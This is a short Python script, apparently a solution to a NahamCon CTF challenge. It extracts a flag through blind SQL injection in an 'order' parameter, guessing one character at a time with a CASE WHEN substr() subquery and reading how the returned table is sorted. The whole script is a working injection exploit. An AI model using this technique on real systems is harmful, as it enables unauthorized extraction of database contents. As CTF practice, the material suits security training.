# Challenge from nahamcon ctf
import requests
from bs4 import BeautifulSoup
import string

url = "http://challenge.nahamcon.com:31611" # do not forget to update your URL.
chars = string.ascii_lowercase+'{_}'
flag=""
counter=1
while True:
    for char in chars:
        r = requests.post(url, data={
            "search":"",
            "order":f"CASE WHEN((select substr(flag,{counter},1) from flag)='{char}') THEN symbol ELSE atomic_number END"
        })

        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table")
        table_body = table.find("tbody")
        rows = table_body.find_all("tr")
        if "Li" in rows[0].text:
            continue
        else:
            flag+=char
            counter+=1
            print(flag)
    if(len(flag) == 20):
        break
